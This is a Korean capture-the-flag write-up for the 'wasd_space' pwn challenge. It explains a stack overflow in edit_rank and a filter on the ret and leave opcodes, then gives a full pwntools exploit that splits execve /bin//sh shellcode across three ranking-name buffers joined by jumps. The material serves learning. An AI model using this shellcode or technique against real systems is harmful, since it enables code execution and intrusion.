# wasd_space

# Concept
- BOF
- NO Nx bit
- No Return


# Writeup
- 단순히 wasd 그리고 space key를 연습할 수 있는 프로그램이다.
- 따로 시간제한은 없지만 틀리면 점수를 얻을 수 없다.
- edit_rank 함수에서 0x30과 30을 혼동해서 랭커들의 정보를 입력할 때 BOF가 일어난다.
- 버퍼를 입력받고 버퍼에 입력된 값들을 체킹하는 함수가 존재한다.
```c
if(check_p[i] == '\xc3' || check_p[i]=='\xc9') {
    puts("No");
    exit(0);
}
```



```c
__int64 edit_rank()
{
  __int64 result; // rax
  char s[32]; // [rsp+0h] [rbp-40h] BYREF
  char buf[32]; // [rsp+20h] [rbp-20h] BYREF

  for ( len = 0; len <= 29; ++len )
    buf[len] = 0;
  len = 0;
  t_len = 0;
  puts("=============");
  puts("Edit rank");
  puts("=============");
  if ( my_score <= Third_score )
    return 0LL;
  printf("your name : ");
  read(0, buf, 0x30uLL);
  len = strlen(buf) + 1;
  checking(buf, (unsigned int)len);
  printf("your text : ");
  read(0, s, 0x30uLL);
  t_len = strlen(s) + 1;
  checking(s, (unsigned int)t_len);
  if ( my_score <= Second_score )
  {
    puts("cong~");
    puts("you are third");
    strncpy(Third_name, buf, len);
    Third_name[len - 1] = 0;
    strncpy(Third_text, s, t_len);
    Third_text[t_len - 1] = 0;
    Third_score = my_score;
    result = 0LL;
  }
  else
  {
    if ( my_score <= First_score )
    {
      puts("con~");
      puts("you are second");
      strncpy(Second_name, buf, len);
      Second_name[len - 1] = 0;
      strncpy(Second_text, s, t_len);
      Second_text[t_len - 1] = 0;
      Second_score = my_score;
    }
    else
    {
      puts("con~");
      puts("you are first");
      strncpy(First_name, buf, len);
      First_name[len - 1] = 0;
      strncpy(First_text, s, t_len);
      First_text[t_len - 1] = 0;
      First_score = my_score;
    }
    result = 0LL;
  }
  return result;
}
```
- checking 함수에서 buf에 들어있는 값이 \xc3 \xc9이면 프로그램을 종료한다.
- c3 과 c9는 각각 return 과 leave 에 해당하는 OPCODE이다.
- 또한 bof 를 일으킬 수 있지만 `s` 입력받는 부분에서는 의미가 없고 `buf`에서 SFP, 그리고 return 주소까지밖에 덮지 못한다.
- nx bit가 걸려있지 않고, main에서 mprotect로 bss에 실행권한을 주었기 때문에 우리가 입력 가능한 bss, 혹은 stack에 쉘코드를 사용하여 공격을 진행할 수 있다.
- 허나 일반적인 쉘코드를 전부 집어넣기에 길이가 짧기 때문에 쉘코드를 분할하는 방법을 사용할 것이다.
- 랭킹에 등재되는 사람들이 3명이기 때문에 3개로 분할하고 BOF가 일어나는 랭커의 이름에 1위, 2위, 3위의 이름에 각각 넣을 것이다.
- 쉘코드 실행 순서는 상관 없지만 First_name - Second_name - Third_name 순으로 쉘코드가 실행되게 할 것이다.
- 분할된 부분에 jmp offset 계산을 후 바이트코드를 추가해준 후 랭커들의 이름에 추가해 주면 된다.

```python
from pwn import *
p = process('wasd_space')
shell1 = b'\x48\x31\xf6\x56'
shell1 += b'\xe9\x37'
shell1 += b'\00'
# \x00 인 이유는 이외의 것은 bytecode 해석할 때 주소계산에 오류가 생긴다.
shell2 = b'\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68'
shell2 += b'\xe9\x31'
shell2 += b'\00'

shell3 = b'\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05' + b'\x90'

def set_first():
    last = shell1+b'A'*(32-len(shell1))
    last += b'SFP_SFP_'
    last += p64(0x4040C0)
    p.sendline(last)
    p.sendline('First_text'.encode())
    pass
def set_second():
    p.sendline(shell2)
    p.sendline('Second_text'.encode())
    pass
def set_third():
    p.sendline(shell3)
    p.sendline('Third_text'.encode())
    p.recvuntil("you are third\n");
    pass
def solve(score):
    p.sendline(b'1')
    count = 0;
    while count < score:
        asdf = p.recvline()
        asdf = p.recvuntil(b"- '")
        print(asdf)
        asdf = p.recv(1)
        p.sendline(asdf)
        count += 100
        pass
    p.sendline(b'!')
    pass

print(p.recvuntil(b'Choice > '))
p.recvline()
solve(1000)
set_third()

print(p.recvuntil(b'Choice > '))
p.recvline()
solve(1200)
set_second()

print(p.recvuntil(b'Choice > '))
solve(1700)
set_first()


p.sendline(b'cat flag')
p.interactive()
```